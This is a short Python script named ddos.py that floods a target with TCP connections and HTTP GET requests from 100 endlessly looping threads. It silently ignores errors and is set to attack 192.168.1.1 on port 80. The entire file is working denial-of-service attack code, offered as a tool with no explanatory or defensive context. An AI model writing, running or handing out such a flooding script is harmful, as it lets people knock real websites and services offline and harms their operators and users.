# ddos.py
import socket, threading

def flood(ip, port):
    def attack():
        while True:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: flood\r\n\r\n")
                s.close()
            except:
                pass
    for _ in range(100):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

flood("192.168.1.1", 80)
